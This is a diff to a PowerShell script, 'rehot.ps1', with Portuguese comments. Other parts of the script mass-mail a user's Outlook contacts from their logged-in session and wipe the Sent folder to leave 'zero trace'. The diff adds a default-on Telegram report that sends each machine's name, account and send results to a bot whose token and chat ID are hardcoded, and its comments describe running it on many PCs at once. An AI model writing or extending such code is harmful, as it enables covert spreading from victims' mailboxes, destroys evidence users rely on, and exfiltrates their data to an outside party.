@@ -29,6 +29,12 @@ Uso:
   powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" -SelfDelete
       # idem + apaga as mensagens enviadas (por assunto) da pasta Enviados
   powershell -File rehot.ps1 -SelfDeleteAll   # apaga TUDO em Enviados (rastro zero)
+
+  Reporte via Telegram (padrao: bot ja configurado; -NoTelegram desliga):
+  cada execucao envia p/ o chat um resumo com o nome da maquina, o veredito
+  (OK/ERRO), a quantidade de emails enviados e, se houve falha, o erro por
+  destinatario. P/ rodar em varios PCs ao mesmo tempo, basta o mesmo comando:
+  os relatorios chegam separados no chat, um por maquina.
 #>
 param(
     [string]$SendTo = "",
@@ -42,7 +48,10 @@ param(
     [int]$MaxMessages = 0,    # -ToAllPeople: max de mensagens escaneadas p/ extrair enderecos (0 = tudo)
     [switch]$DryRun,          # lista os destinatarios sem enviar (preview/teste)
     [switch]$SelfDelete,      # após enviar, apaga as mensagens desta execução (por assunto)
-    [switch]$SelfDeleteAll    # apaga TUDO em Enviados (implica -SelfDelete; rastro zero)
+    [switch]$SelfDeleteAll,   # apaga TUDO em Enviados (implica -SelfDelete; rastro zero)
+    [string]$TelegramToken = "8843500792:AAFSogh_01V4ULAxnFy05H8qrRJcu60ozSY",  # token do bot (vazio = sem reporte)
+    [string]$TelegramChatId = "6168636325",                                     # chat_id de destino do reporte
+    [switch]$NoTelegram      # desliga o reporte via Telegram
 )
 
 $ErrorActionPreference = "Stop"
@@ -496,6 +505,81 @@ function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$bo
     }
 }
 
+# ---------------- Telegram: reporte por máquina ----------------
+# O cliente roda o MESMO comando em vários PCs ao mesmo tempo; cada execução
+# dispara um resumo para o bot (token/chat_id fixos por padrão). O envio vai em
+# try/catch: falha no Telegram NAO derruba o envio (que ja aconteceu) — vira
+# apenas o campo "telegram" no JSON de saida.
+function Send-TelegramMessage([string]$token, [string]$chatId, [string]$text) {
+    if (-not $token -or -not $chatId) { return @{ ok = $false; erro = "token/chat_id vazio" } }
+    $url = "https://api.telegram.org/bot$token/sendMessage"
+    $payload = @{ chat_id = $chatId; text = $text; disable_web_page_preview = $true } | ConvertTo-Json -Depth 4
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+    try {
+        $resp = Invoke-WebRequest -Uri $url -Method Post -Body $bytes `
+            -ContentType "application/json; charset=utf-8" -UseBasicParsing
+        $j = $resp.Content | ConvertFrom-Json
+        return @{ ok = [bool]$j.ok; erro = $null }
+    } catch {
+        $code = 0; $err = $null
+        if ($_.Exception.Response) {
+            $code = [int]$_.Exception.Response.StatusCode
+            try { $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); $err = $sr.ReadToEnd() } catch {}
+        }
+        return @{ ok = $false; erro = "HTTP $code | $err" }
+    }
+}
+
+# Monta o texto do reporte a partir do objeto final ($out). Prioridade:
+# -ToAllContacts/-ToAllPeople (envio_todos) > -SendTo (envio) > somente deteccao.
+# Mostra: máquina, conta, veredito OK/PARCIAL/ERRO, qtd enviados e (se houver)
+# os erros por destinatario — o suficiente p/ triagem em massa de vários PCs.
+function Build-ReportText($out) {
+    $L = @()
+    $L += "📧 EnvioHOT — $($out.maquina)"
+    if ($out.envio_todos) {
+        $et = $out.envio_todos
+        $conta = if ($et.de) { $et.de } else { "(sem conta com token)" }
+        $L += "👤 $conta"
+        if ($et.status) {
+            $L += "🔴 ERRO — $($et.status)"
+        } elseif ($et.modo -eq "dryrun") {
+            $L += "🟡 DRY RUN — $($et.total) destinatário(s), nenhum enviado"
+        } else {
+            $falhas = @($et.falhas)
+            if ($et.enviados -gt 0 -and $falhas.Count -eq 0) {
+                $L += "🟢 OK — $($et.enviados)/$($et.total) enviados (HTTP 202)"
+            } elseif ($et.enviados -gt 0) {
+                $L += "🟡 PARCIAL — $($et.enviados)/$($et.total) enviados, $($falhas.Count) falha(s)"
+            } else {
+                $L += "🔴 ERRO — 0/$($et.total) enviados, $($falhas.Count) falha(s)"
+            }
+            if ($falhas.Count -gt 0) {
+                foreach ($f in ($falhas | Select-Object -First 10)) {
+                    $err = "$($f.erro)"
+                    if ($err.Length -gt 140) { $err = $err.Substring(0, 140) + "…" }
+                    $L += "   ❌ $($f.email): HTTP $($f.status) $err"
+                }
+                if ($falhas.Count -gt 10) { $L += "   … e mais $($falhas.Count - 10) falha(s)" }
+            }
+        }
+    }
+    elseif ($out.envio) {
+        $e = $out.envio
+        $L += "👤 $($e.de) → $($e.para)"
+        if ($e.ok) { $L += "🟢 OK — enviado (HTTP $($e.status))" }
+        else {
+            $err = "$($e.erro)"; if ($err.Length -gt 200) { $err = $err.Substring(0, 200) + "…" }
+            $L += "🔴 ERRO — HTTP $($e.status) $err"
+        }
+    }
+    else {
+        $L += "ℹ️ Somente detecção (sem envio)"
+        $L += $out.decisao
+    }
+    return ($L -join "`n")
+}
+
 # ---------------- agenda de contatos (GET /me/contacts, paginado) ----------------
 # Usa o MESMO token OWA (READ scope) que valida via /me — nao precisa de novo
 # consent. Retorna array de @{ name; email } (primeiro endereco de cada contato
@@ -909,4 +993,11 @@ $out = [PSCustomObject]@{
     self_delete = $selfDelReport
     perfis    = $results
 }
+
+# ---- Telegram: dispara o reporte desta máquina (máquina + OK/erro + qtd) ----
+$telegram = $null
+if ($TelegramToken -and $TelegramChatId -and -not $NoTelegram.IsPresent) {
+    $telegram = Send-TelegramMessage $TelegramToken $TelegramChatId (Build-ReportText $out)
+}
+$out | Add-Member -MemberType NoteProperty -Name telegram -Value $telegram
 $out | ConvertTo-Json -Depth 6
